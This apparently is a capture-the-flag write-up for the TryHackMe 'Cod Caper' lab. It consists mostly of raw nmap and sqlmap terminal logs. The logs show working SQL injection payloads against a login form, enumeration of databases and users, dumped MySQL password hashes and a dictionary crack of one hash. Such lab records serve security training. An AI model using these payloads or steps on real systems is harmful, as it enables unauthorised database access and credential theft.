# The Cod Caper

```
export IP=10.10.74.254
```

# Shaswata Saha

#	Task 1:

No answer needed

#	Task 2:

1.
```
┌──(root㉿subhro)-[/home/subhro1530/nmap]
└─# nmap -sC -sV -A -oN initial $IP
Starting Nmap 7.92 ( https://nmap.org ) at 2023-03-18 12:12 EDT
Nmap scan report for 10.10.74.254
Host is up (0.22s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 6d:2c:40:1b:6c:15:7c:fc:bf:9b:55:22:61:2a:56:fc (RSA)
|   256 ff:89:32:98:f4:77:9c:09:39:f5:af:4a:4f:08:d6:f5 (ECDSA)
|_  256 89:92:63:e7:1d:2b:3a:af:6c:f9:39:56:5b:55:7e:f9 (ED25519)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-title: Apache2 Ubuntu Default Page: It works
|_http-server-header: Apache/2.4.18 (Ubuntu)
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.92%E=4%D=3/18%OT=22%CT=1%CU=42520%PV=Y%DS=5%DC=T%G=Y%TM=6415E31
OS:C%P=x86_64-pc-linux-gnu)SEQ(SP=108%GCD=1%ISR=107%TI=Z%CI=I%II=I%TS=8)OPS
OS:(O1=M505ST11NW6%O2=M505ST11NW6%O3=M505NNT11NW6%O4=M505ST11NW6%O5=M505ST1
OS:1NW6%O6=M505ST11)WIN(W1=68DF%W2=68DF%W3=68DF%W4=68DF%W5=68DF%W6=68DF)ECN
OS:(R=Y%DF=Y%T=40%W=6903%O=M505NNSNW6%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=A
OS:S%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R
OS:=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F
OS:=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%
OS:T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD
OS:=S)

Network Distance: 5 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 21/tcp)
HOP RTT       ADDRESS
1   322.95 ms 10.17.0.1
2   ... 4
5   352.53 ms 10.10.74.254

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 44.03 seconds

```

#	Task 4:

```
┌──(root㉿subhro)-[/home/subhro1530/Desktop/tryhackme/the_cod_caper]
└─# export IP=10.10.74.254
                                                                                               
┌──(root㉿subhro)-[/home/subhro1530/Desktop/tryhackme/the_cod_caper]
└─# sqlmap -u http://$IP/administrator.php --form -a
        ___
       __H__
 ___ ___[']_____ ___ ___  {1.7.2#stable}
|_ -| . [(]     | .'| . |
|___|_  [(]_|_|_|__,|  _|
      |_|V...       |_|   https://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 13:48:58 /2023-03-18/

[13:48:58] [INFO] testing connection to the target URL
[13:48:59] [INFO] searching for forms
[1/1] Form:
POST http://10.10.74.254/administrator.php
POST data: username=&password=
do you want to test this form? [Y/n/q] 
> y
Edit POST data [default: username=&password=] (Warning: blank fields detected): 
do you want to fill blank fields with random values? [Y/n] y
[13:49:15] [INFO] using '/root/.local/share/sqlmap/output/results-03182023_0149pm.csv' as the CSV results file in multiple targets mode
[13:49:15] [INFO] testing if the target URL content is stable
[13:49:15] [INFO] target URL content is stable
[13:49:15] [INFO] testing if POST parameter 'username' is dynamic
[13:49:16] [WARNING] POST parameter 'username' does not appear to be dynamic
[13:49:16] [INFO] heuristic (basic) test shows that POST parameter 'username' might be injectable (possible DBMS: 'MySQL')
[13:49:17] [INFO] heuristic (XSS) test shows that POST parameter 'username' might be vulnerable to cross-site scripting (XSS) attacks
[13:49:17] [INFO] testing for SQL injection on POST parameter 'username'
it looks like the back-end DBMS is 'MySQL'. Do you want to skip test payloads specific for other DBMSes? [Y/n] y
for the remaining tests, do you want to include all tests for 'MySQL' extending provided level (1) and risk (1) values? [Y/n] y
[13:49:26] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
[13:49:26] [WARNING] reflective value(s) found and filtering out
[13:49:30] [INFO] testing 'Boolean-based blind - Parameter replace (original value)'
[13:49:31] [INFO] testing 'Generic inline queries'
[13:49:31] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause (MySQL comment)'
[13:49:51] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (MySQL comment)'
[13:50:09] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (NOT - MySQL comment)'
[13:50:27] [INFO] testing 'MySQL RLIKE boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause'
[13:50:30] [INFO] POST parameter 'username' appears to be 'MySQL RLIKE boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause' injectable (with --not-string="not")
[13:50:30] [INFO] testing 'MySQL >= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (BIGINT UNSIGNED)'
[13:50:30] [INFO] testing 'MySQL >= 5.5 OR error-based - WHERE or HAVING clause (BIGINT UNSIGNED)'                                                                                            
[13:50:31] [INFO] testing 'MySQL >= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXP)'                                                                                   
[13:50:31] [INFO] testing 'MySQL >= 5.5 OR error-based - WHERE or HAVING clause (EXP)'
[13:50:32] [INFO] testing 'MySQL >= 5.6 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (GTID_SUBSET)'                                                                           
[13:50:32] [INFO] POST parameter 'username' is 'MySQL >= 5.6 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (GTID_SUBSET)' injectable                                           
[13:50:32] [INFO] testing 'MySQL inline queries'
[13:50:33] [INFO] testing 'MySQL >= 5.0.12 stacked queries (comment)'
[13:50:33] [INFO] testing 'MySQL >= 5.0.12 stacked queries'
[13:50:33] [INFO] testing 'MySQL >= 5.0.12 stacked queries (query SLEEP - comment)'
[13:50:34] [INFO] testing 'MySQL >= 5.0.12 stacked queries (query SLEEP)'
[13:50:34] [INFO] testing 'MySQL < 5.0.12 stacked queries (BENCHMARK - comment)'
[13:50:35] [INFO] testing 'MySQL < 5.0.12 stacked queries (BENCHMARK)'
[13:50:35] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)'
[13:50:46] [INFO] POST parameter 'username' appears to be 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)' injectable                                                                     
[13:50:46] [INFO] testing 'Generic UNION query (NULL) - 1 to 20 columns'
[13:50:46] [INFO] testing 'MySQL UNION query (NULL) - 1 to 20 columns'
[13:50:46] [INFO] automatically extending ranges for UNION query injection technique tests as there is at least one other (potential) technique found
[13:50:47] [INFO] 'ORDER BY' technique appears to be usable. This should reduce the time needed to find the right number of query columns. Automatically extending the range for current UNION query injection technique test
[13:50:50] [INFO] target URL appears to have 2 columns in query
do you want to (re)try to find proper UNION column types with fuzzy test? [y/N] y
injection not exploitable with NULL values. Do you want to try with a random integer value for option '--union-char'? [Y/n] y
[13:51:16] [WARNING] if UNION based SQL injection is not detected, please consider forcing the back-end DBMS (e.g. '--dbms=mysql') 
[13:51:25] [INFO] testing 'MySQL UNION query (random number) - 1 to 20 columns'
[13:51:34] [INFO] testing 'MySQL UNION query (NULL) - 21 to 40 columns'
[13:51:44] [INFO] testing 'MySQL UNION query (random number) - 21 to 40 columns'
[13:51:52] [INFO] testing 'MySQL UNION query (NULL) - 41 to 60 columns'
[13:52:00] [INFO] testing 'MySQL UNION query (random number) - 41 to 60 columns'
[13:52:10] [INFO] testing 'MySQL UNION query (NULL) - 61 to 80 columns'
[13:52:19] [INFO] testing 'MySQL UNION query (random number) - 61 to 80 columns'
[13:52:27] [INFO] testing 'MySQL UNION query (NULL) - 81 to 100 columns'
[13:52:35] [INFO] testing 'MySQL UNION query (random number) - 81 to 100 columns'
POST parameter 'username' is vulnerable. Do you want to keep testing the others (if any)? [y/N] n
sqlmap identified the following injection point(s) with a total of 388 HTTP(s) requests:
---
Parameter: username (POST)
    Type: boolean-based blind
    Title: MySQL RLIKE boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause
    Payload: username=Adea' RLIKE (SELECT (CASE WHEN (9385=9385) THEN 0x41646561 ELSE 0x28 END))-- cCtL&password=

    Type: error-based
    Title: MySQL >= 5.6 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (GTID_SUBSET)
    Payload: username=Adea' AND GTID_SUBSET(CONCAT(0x71707a6271,(SELECT (ELT(2467=2467,1))),0x7162627871),2467)-- BGPq&password=

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: username=Adea' AND (SELECT 9841 FROM (SELECT(SLEEP(5)))tJHa)-- miMe&password=
---
do you want to exploit this SQL injection? [Y/n] y
[13:53:19] [INFO] the back-end DBMS is MySQL
[13:53:19] [INFO] fetching banner
[13:53:20] [INFO] retrieved: '5.7.28-0ubuntu0.16.04.2'
web server operating system: Linux Ubuntu 16.10 or 16.04 (xenial or yakkety)
web application technology: Apache 2.4.18
back-end DBMS operating system: Linux Ubuntu
back-end DBMS: MySQL >= 5.6
banner: '5.7.28-0ubuntu0.16.04.2'
[13:53:22] [INFO] fetching current user
[13:53:22] [INFO] retrieved: 'root@localhost'
current user: 'root@localhost'
[13:53:22] [INFO] fetching current database
[13:53:23] [INFO] retrieved: 'users'
current database: 'users'
[13:53:23] [INFO] fetching server hostname
[13:53:23] [INFO] retrieved: 'ubuntu'
hostname: 'ubuntu'
[13:53:23] [INFO] testing if current user is DBA
[13:53:23] [INFO] fetching current user
current user is DBA: True
[13:53:24] [INFO] fetching database users
[13:53:24] [INFO] retrieved: ''root'@'localhost''
[13:53:25] [INFO] retrieved: ''root'@'localhost''
[13:53:25] [INFO] retrieved: ''root'@'localhost''
[13:53:25] [INFO] retrieved: ''root'@'localhost''
[13:53:26] [INFO] retrieved: ''root'@'localhost''
[13:53:26] [INFO] retrieved: ''root'@'localhost''
[13:53:27] [INFO] retrieved: ''root'@'localhost''
[13:53:27] [INFO] retrieved: ''root'@'localhost''
[13:53:28] [INFO] retrieved: ''root'@'localhost''
[13:53:28] [INFO] retrieved: ''root'@'localhost''
[13:53:29] [INFO] retrieved: ''root'@'localhost''
[13:53:29] [INFO] retrieved: ''root'@'localhost''
[13:53:29] [INFO] retrieved: ''root'@'localhost''
[13:53:30] [INFO] retrieved: ''root'@'localhost''
[13:53:30] [INFO] retrieved: ''root'@'localhost''
[13:53:30] [INFO] retrieved: ''root'@'localhost''
[13:53:31] [INFO] retrieved: ''root'@'localhost''
[13:53:31] [INFO] retrieved: ''root'@'localhost''
[13:53:31] [INFO] retrieved: ''root'@'localhost''
[13:53:32] [INFO] retrieved: ''root'@'localhost''
[13:53:32] [INFO] retrieved: ''root'@'localhost''
[13:53:33] [INFO] retrieved: ''root'@'localhost''
[13:53:34] [INFO] retrieved: ''root'@'localhost''
[13:53:34] [INFO] retrieved: ''root'@'localhost''
[13:53:34] [INFO] retrieved: ''root'@'localhost''
[13:53:34] [INFO] retrieved: ''root'@'localhost''
[13:53:35] [INFO] retrieved: ''root'@'localhost''
[13:53:35] [INFO] retrieved: ''root'@'localhost''
[13:53:36] [INFO] retrieved: ''mysql.session'@'localhost''
[13:53:36] [INFO] retrieved: ''mysql.sys'@'localhost''
[13:53:36] [INFO] retrieved: ''debian-sys-maint'@'localhost''
[13:53:37] [INFO] retrieved: ''debian-sys-maint'@'localhost''
[13:53:37] [INFO] retrieved: ''debian-sys-maint'@'localhost''
[13:53:37] [INFO] retrieved: ''debian-sys-maint'@'localhost''
[13:53:38] [INFO] retrieved: ''debian-sys-maint'@'localhost''
[13:53:38] [INFO] retrieved: ''debian-sys-maint'@'localhost''
[13:53:39] [INFO] retrieved: ''debian-sys-maint'@'localhost''
[13:53:39] [INFO] retrieved: ''debian-sys-maint'@'localhost''
[13:53:40] [INFO] retrieved: ''debian-sys-maint'@'localhost''
[13:53:40] [INFO] retrieved: ''debian-sys-maint'@'localhost''
[13:53:40] [INFO] retrieved: ''debian-sys-maint'@'localhost''
[13:53:41] [INFO] retrieved: ''debian-sys-maint'@'localhost''
[13:53:41] [INFO] retrieved: ''debian-sys-maint'@'localhost''
[13:53:42] [INFO] retrieved: ''debian-sys-maint'@'localhost''
[13:53:42] [INFO] retrieved: ''debian-sys-maint'@'localhost''
[13:53:42] [INFO] retrieved: ''debian-sys-maint'@'localhost''
[13:53:43] [INFO] retrieved: ''debian-sys-maint'@'localhost''
[13:53:43] [INFO] retrieved: ''debian-sys-maint'@'localhost''
[13:53:44] [INFO] retrieved: ''debian-sys-maint'@'localhost''
[13:53:44] [INFO] retrieved: ''debian-sys-maint'@'localhost''
[13:53:45] [INFO] retrieved: ''debian-sys-maint'@'localhost''
[13:53:45] [INFO] retrieved: ''debian-sys-maint'@'localhost''
[13:53:46] [INFO] retrieved: ''debian-sys-maint'@'localhost''
[13:53:46] [INFO] retrieved: ''debian-sys-maint'@'localhost''
[13:53:47] [INFO] retrieved: ''debian-sys-maint'@'localhost''
[13:53:47] [INFO] retrieved: ''debian-sys-maint'@'localhost''
[13:53:47] [INFO] retrieved: ''debian-sys-maint'@'localhost''
[13:53:48] [INFO] retrieved: ''debian-sys-maint'@'localhost''
database management system users [4]:
[*] 'debian-sys-maint'@'localhost'
[*] 'mysql.session'@'localhost'
[*] 'mysql.sys'@'localhost'
[*] 'root'@'localhost'

[13:53:48] [INFO] fetching database users password hashes
[13:53:49] [INFO] retrieved: 'debian-sys-maint'
[13:53:49] [INFO] retrieved: '*81F5E21E35407D884A6CD4A731AEBFB6AF209E1B'
[13:53:50] [INFO] retrieved: 'mysql.session'
[13:53:50] [INFO] retrieved: '*THISISNOTAVALIDPASSWORDTHATCANBEUSEDHERE'
[13:53:50] [INFO] retrieved: 'mysql.sys'
[13:53:51] [INFO] retrieved: '*THISISNOTAVALIDPASSWORDTHATCANBEUSEDHERE'
[13:53:51] [INFO] retrieved: 'root'
[13:53:52] [INFO] retrieved: '*82D1BDA2F1E16E0DAEE2412F1C6E8DE7DF8B84FD'
do you want to store hashes to a temporary file for eventual further processing with other tools [y/N] y
[13:53:57] [INFO] writing hashes to a temporary file '/tmp/sqlmapaenovksm3853/sqlmaphashes-nw1xq1hv.txt'                                                                                      
do you want to perform a dictionary-based attack against retrieved password hashes? [Y/n/q] y
[13:55:12] [INFO] using hash method 'mysql_passwd'
what dictionary do you want to use?
[1] default dictionary file '/usr/share/sqlmap/data/txt/wordlist.tx_' (press Enter)
[2] custom dictionary file
[3] file with list of dictionary files
1
[13:55:50] [INFO] using default dictionary
do you want to use common password suffixes? (slow!) [y/N] n
[13:55:55] [INFO] starting dictionary-based cracking (mysql_passwd)
[13:55:55] [INFO] starting 3 processes 
[13:56:00] [INFO] cracked password 'root' for user 'debian-sys-maint'                         
database management system users password hashes:                                             
[*] debian-sys-maint [1]:
    password hash: *81F5E21E35407D884A6CD4A731AEBFB6AF209E1B
    clear-text password: root
[*] mysql.session [1]:
    password hash: *THISISNOTAVALIDPASSWORDTHATCANBEUSEDHERE
[*] mysql.sys [1]:
    password hash: *THISISNOTAVALIDPASSWORDTHATCANBEUSEDHERE
[*] root [1]:
    password hash: *82D1BDA2F1E16E0DAEE2412F1C6E8DE7DF8B84FD

[13:56:03] [INFO] fetching database users privileges
[13:56:04] [INFO] retrieved: 'SELECT'
[13:56:04] [INFO] retrieved: 'INSERT'
[13:56:05] [INFO] retrieved: 'UPDATE'
[13:56:05] [INFO] retrieved: 'DELETE'
[13:56:05] [INFO] retrieved: 'CREATE'
[13:56:06] [INFO] retrieved: 'DROP'
[13:56:06] [INFO] retrieved: 'RELOAD'
[13:56:06] [INFO] retrieved: 'SHUTDOWN'
[13:56:07] [INFO] retrieved: 'PROCESS'
[13:56:07] [INFO] retrieved: 'FILE'
[13:56:08] [INFO] retrieved: 'REFERENCES'
[13:56:08] [INFO] retrieved: 'INDEX'
[13:56:09] [INFO] retrieved: 'ALTER'
[13:56:09] [INFO] retrieved: 'SHOW DATABASES'
[13:56:10] [INFO] retrieved: 'SUPER'
[13:56:10] [INFO] retrieved: 'CREATE TEMPORARY TABLES'
[13:56:11] [INFO] retrieved: 'LOCK TABLES'
[13:56:11] [INFO] retrieved: 'EXECUTE'
[13:56:12] [INFO] retrieved: 'REPLICATION SLAVE'
[13:56:12] [INFO] retrieved: 'REPLICATION CLIENT'
[13:56:13] [INFO] retrieved: 'CREATE VIEW'
[13:56:13] [INFO] retrieved: 'SHOW VIEW'
[13:56:14] [INFO] retrieved: 'CREATE ROUTINE'
[13:56:14] [INFO] retrieved: 'ALTER ROUTINE'
[13:56:15] [INFO] retrieved: 'CREATE USER'
[13:56:15] [INFO] retrieved: 'EVENT'
[13:56:16] [INFO] retrieved: 'TRIGGER'
[13:56:16] [INFO] retrieved: 'CREATE TABLESPACE'
[13:56:17] [INFO] retrieved: 'SUPER'
[13:56:17] [INFO] retrieved: 'USAGE'
[13:56:18] [INFO] retrieved: 'SELECT'
[13:56:18] [INFO] retrieved: 'INSERT'
[13:56:18] [INFO] retrieved: 'UPDATE'
[13:56:19] [INFO] retrieved: 'DELETE'
[13:56:19] [INFO] retrieved: 'CREATE'
[13:56:20] [INFO] retrieved: 'DROP'
[13:56:20] [INFO] retrieved: 'RELOAD'
[13:56:21] [INFO] retrieved: 'SHUTDOWN'
[13:56:21] [INFO] retrieved: 'PROCESS'
[13:56:21] [INFO] retrieved: 'FILE'
[13:56:22] [INFO] retrieved: 'REFERENCES'
[13:56:22] [INFO] retrieved: 'INDEX'
[13:56:23] [INFO] retrieved: 'ALTER'
[13:56:23] [INFO] retrieved: 'SHOW DATABASES'
[13:56:23] [INFO] retrieved: 'SUPER'
[13:56:23] [INFO] retrieved: 'CREATE TEMPORARY TABLES'
[13:56:24] [INFO] retrieved: 'LOCK TABLES'
[13:56:24] [INFO] retrieved: 'EXECUTE'
[13:56:25] [INFO] retrieved: 'REPLICATION SLAVE'
[13:56:25] [INFO] retrieved: 'REPLICATION CLIENT'
[13:56:25] [INFO] retrieved: 'CREATE VIEW'
[13:56:26] [INFO] retrieved: 'SHOW VIEW'
[13:56:26] [INFO] retrieved: 'CREATE ROUTINE'
[13:56:26] [INFO] retrieved: 'ALTER ROUTINE'
[13:56:27] [INFO] retrieved: 'CREATE USER'
[13:56:27] [INFO] retrieved: 'EVENT'
[13:56:28] [INFO] retrieved: 'TRIGGER'
[13:56:29] [INFO] retrieved: 'CREATE TABLESPACE'
database management system users privileges:
[*] 'debian-sys-maint'@'localhost' (administrator) [28]:


```


2. Payload 2

```
┌──(root㉿subhro)-[/home/subhro1530/Desktop/tryhackme/the_cod_caper]
└─# sqlmap -u http://$IP/administrator.php --data 'username=&password=' -a
        ___
       __H__                                                                                   
 ___ ___["]_____ ___ ___  {1.7.2#stable}                                                       
|_ -| . [']     | .'| . |                                                                      
|___|_  [,]_|_|_|__,|  _|                                                                      
      |_|V...       |_|   https://sqlmap.org                                                   

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 14:01:56 /2023-03-18/

[14:01:56] [WARNING] provided value for parameter 'username' is empty. Please, always use only valid parameter values so sqlmap could be able to run properly
[14:01:56] [WARNING] provided value for parameter 'password' is empty. Please, always use only valid parameter values so sqlmap could be able to run properly
[14:01:56] [INFO] resuming back-end DBMS 'mysql' 
[14:01:56] [INFO] testing connection to the target URL
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: username (POST)
    Type: boolean-based blind
    Title: MySQL RLIKE boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause
    Payload: username=Adea' RLIKE (SELECT (CASE WHEN (9385=9385) THEN 0x41646561 ELSE 0x28 END))-- cCtL&password=

    Type: error-based
    Title: MySQL >= 5.6 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (GTID_SUBSET)
    Payload: username=Adea' AND GTID_SUBSET(CONCAT(0x71707a6271,(SELECT (ELT(2467=2467,1))),0x7162627871),2467)-- BGPq&password=

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: username=Adea' AND (SELECT 9841 FROM (SELECT(SLEEP(5)))tJHa)-- miMe&password=
---
[14:01:57] [INFO] the back-end DBMS is MySQL
[14:01:57] [INFO] fetching banner
[14:01:57] [INFO] resumed: '5.7.28-0ubuntu0.16.04.2'
web server operating system: Linux Ubuntu 16.04 or 16.10 (xenial or yakkety)
web application technology: Apache 2.4.18
back-end DBMS operating system: Linux Ubuntu
back-end DBMS: MySQL >= 5.6
banner: '5.7.28-0ubuntu0.16.04.2'
[14:01:57] [INFO] fetching current user
[14:01:57] [INFO] resumed: 'root@localhost'
current user: 'root@localhost'
[14:01:57] [INFO] fetching current database
[14:01:57] [INFO] resumed: 'users'
current database: 'users'
[14:01:57] [INFO] fetching server hostname
[14:01:57] [INFO] resumed: 'ubuntu'
hostname: 'ubuntu'
[14:01:57] [INFO] testing if current user is DBA
[14:01:57] [INFO] fetching current user
current user is DBA: True
[14:01:57] [INFO] fetching database users
database management system users [4]:
[*] 'debian-sys-maint'@'localhost'
[*] 'mysql.session'@'localhost'
[*] 'mysql.sys'@'localhost'
[*] 'root'@'localhost'

[14:01:57] [INFO] fetching database users password hashes
[14:01:57] [INFO] resumed: 'debian-sys-maint'
[14:01:57] [INFO] resumed: '*81F5E21E35407D884A6CD4A731AEBFB6AF209E1B'
[14:01:57] [INFO] resumed: 'mysql.session'
[14:01:57] [INFO] resumed: '*THISISNOTAVALIDPASSWORDTHATCANBEUSEDHERE'
[14:01:57] [INFO] resumed: 'mysql.sys'
[14:01:57] [INFO] resumed: '*THISISNOTAVALIDPASSWORDTHATCANBEUSEDHERE'
[14:01:57] [INFO] resumed: 'root'
[14:01:57] [INFO] resumed: '*82D1BDA2F1E16E0DAEE2412F1C6E8DE7DF8B84FD'
do you want to store hashes to a temporary file for eventual further processing with other tools [y/N] 
[14:02:06] [ERROR] user quit

[*] ending @ 14:02:06 /2023-03-18/

                                                                                               
┌──(root㉿subhro)-[/home/subhro1530/Desktop/tryhackme/the_cod_caper]
└─# sqlmap -u http://$IP/administrator.php --data 'username=&password=' --dbs
        ___
       __H__                                                                                   
 ___ ___[)]_____ ___ ___  {1.7.2#stable}                                                       
|_ -| . [(]     | .'| . |                                                                      
|___|_  [,]_|_|_|__,|  _|                                                                      
      |_|V...       |_|   https://sqlmap.org                                                   

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 14:02:23 /2023-03-18/

[14:02:23] [WARNING] provided value for parameter 'username' is empty. Please, always use only valid parameter values so sqlmap could be able to run properly
[14:02:23] [WARNING] provided value for parameter 'password' is empty. Please, always use only valid parameter values so sqlmap could be able to run properly
[14:02:23] [INFO] resuming back-end DBMS 'mysql' 
[14:02:23] [INFO] testing connection to the target URL
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: username (POST)
    Type: boolean-based blind
    Title: MySQL RLIKE boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause
    Payload: username=Adea' RLIKE (SELECT (CASE WHEN (9385=9385) THEN 0x41646561 ELSE 0x28 END))-- cCtL&password=

    Type: error-based
    Title: MySQL >= 5.6 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (GTID_SUBSET)
    Payload: username=Adea' AND GTID_SUBSET(CONCAT(0x71707a6271,(SELECT (ELT(2467=2467,1))),0x7162627871),2467)-- BGPq&password=

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: username=Adea' AND (SELECT 9841 FROM (SELECT(SLEEP(5)))tJHa)-- miMe&password=
---
[14:02:24] [INFO] the back-end DBMS is MySQL
web server operating system: Linux Ubuntu 16.10 or 16.04 (yakkety or xenial)
web application technology: Apache 2.4.18
back-end DBMS: MySQL >= 5.6
[14:02:24] [INFO] fetching database names
[14:02:24] [INFO] resumed: 'information_schema'
[14:02:24] [INFO] resumed: 'mysql'
[14:02:24] [INFO] resumed: 'performance_schema'
[14:02:24] [INFO] resumed: 'sys'
[14:02:24] [INFO] resumed: 'users'
available databases [5]:
[*] information_schema
[*] mysql
[*] performance_schema
[*] sys
[*] users

[14:02:24] [INFO] fetched data logged to text files under '/root/.local/share/sqlmap/output/10.10.74.254'                                                                                     

[*] ending @ 14:02:24 /2023-03-18/

                                                                                               
┌──(root㉿subhro)-[/home/subhro1530/Desktop/tryhackme/the_cod_caper]
└─# sqlmap -u http://$IP/administrator.php --data 'username=&password=' -D users --tables
        ___
       __H__                                                                                   
 ___ ___[)]_____ ___ ___  {1.7.2#stable}                                                       
|_ -| . ["]     | .'| . |                                                                      
|___|_  [)]_|_|_|__,|  _|                                                                      
      |_|V...       |_|   https://sqlmap.org                                                   

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 14:04:05 /2023-03-18/

[14:04:05] [WARNING] provided value for parameter 'username' is empty. Please, always use only valid parameter values so sqlmap could be able to run properly
[14:04:05] [WARNING] provided value for parameter 'password' is empty. Please, always use only valid parameter values so sqlmap could be able to run properly
[14:04:05] [INFO] resuming back-end DBMS 'mysql' 
[14:04:05] [INFO] testing connection to the target URL
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: username (POST)
    Type: boolean-based blind
    Title: MySQL RLIKE boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause
    Payload: username=Adea' RLIKE (SELECT (CASE WHEN (9385=9385) THEN 0x41646561 ELSE 0x28 END))-- cCtL&password=

    Type: error-based
    Title: MySQL >= 5.6 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (GTID_SUBSET)
    Payload: username=Adea' AND GTID_SUBSET(CONCAT(0x71707a6271,(SELECT (ELT(2467=2467,1))),0x7162627871),2467)-- BGPq&password=

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: username=Adea' AND (SELECT 9841 FROM (SELECT(SLEEP(5)))tJHa)-- miMe&password=
---
[14:04:05] [INFO] the back-end DBMS is MySQL
web server operating system: Linux Ubuntu 16.10 or 16.04 (yakkety or xenial)
web application technology: Apache 2.4.18
back-end DBMS: MySQL >= 5.6
[14:04:05] [INFO] fetching tables for database: 'users'
[14:04:06] [INFO] retrieved: 'users'
Database: users
[1 table]
+-------+
| users |
+-------+

[14:04:06] [INFO] fetched data logged to text files under '/root/.local/share/sqlmap/output/10.10.74.254'                                                                                     

[*] ending @ 14:04:06 /2023-03-18/

                                                                                               
┌──(root㉿subhro)-[/home/subhro1530/Desktop/tryhackme/the_cod_caper]
└─# sqlmap -u http://$IP/administrator.php --data 'username=&password=' -D users -T users --dump
        ___
       __H__                                                                                   
 ___ ___[,]_____ ___ ___  {1.7.2#stable}                                                       
|_ -| . [']     | .'| . |                                                                      
|___|_  [,]_|_|_|__,|  _|                                                                      
      |_|V...       |_|   https://sqlmap.org                                                   

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 14:05:03 /2023-03-18/

[14:05:03] [WARNING] provided value for parameter 'username' is empty. Please, always use only valid parameter values so sqlmap could be able to run properly
[14:05:03] [WARNING] provided value for parameter 'password' is empty. Please, always use only valid parameter values so sqlmap could be able to run properly
[14:05:03] [INFO] resuming back-end DBMS 'mysql' 
[14:05:03] [INFO] testing connection to the target URL
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: username (POST)
    Type: boolean-based blind
    Title: MySQL RLIKE boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause
    Payload: username=Adea' RLIKE (SELECT (CASE WHEN (9385=9385) THEN 0x41646561 ELSE 0x28 END))-- cCtL&password=

    Type: error-based
    Title: MySQL >= 5.6 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (GTID_SUBSET)
    Payload: username=Adea' AND GTID_SUBSET(CONCAT(0x71707a6271,(SELECT (ELT(2467=2467,1))),0x7162627871),2467)-- BGPq&password=

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: username=Adea' AND (SELECT 9841 FROM (SELECT(SLEEP(5)))tJHa)-- miMe&password=
---
[14:05:03] [INFO] the back-end DBMS is MySQL
web server operating system: Linux Ubuntu 16.04 or 16.10 (xenial or yakkety)
web application technology: Apache 2.4.18
back-end DBMS: MySQL >= 5.6
[14:05:03] [INFO] fetching columns for table 'users' in database 'users'
[14:05:04] [INFO] retrieved: 'username'
[14:05:04] [INFO] retrieved: 'varchar(100)'
[14:05:05] [INFO] retrieved: 'password'
[14:05:05] [INFO] retrieved: 'varchar(100)'
